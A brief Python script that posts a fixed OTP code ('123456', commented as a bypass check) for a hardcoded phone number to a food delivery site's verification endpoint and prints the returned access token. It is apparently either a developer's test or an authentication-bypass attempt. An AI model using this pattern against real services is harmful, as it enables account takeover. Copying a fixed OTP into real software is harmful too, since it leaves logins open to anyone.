import requests
import json

BASE_URL = "https://dharaifooddelivery.in"
PHONE = "+919786816188"

def get_new_res_token():
    # Verify OTP (Bypass check)
    r = requests.post(f"{BASE_URL}/auth/verify-otp", json={"phone_number": PHONE, "otp_code": "123456"})
    print(f"Verify Response: {r.status_code} {r.json()}")
    return r.json().get("access_token")

if __name__ == "__main__":
    token = get_new_res_token()
    if token:
        print(f"Token (start): {token[:10]}")
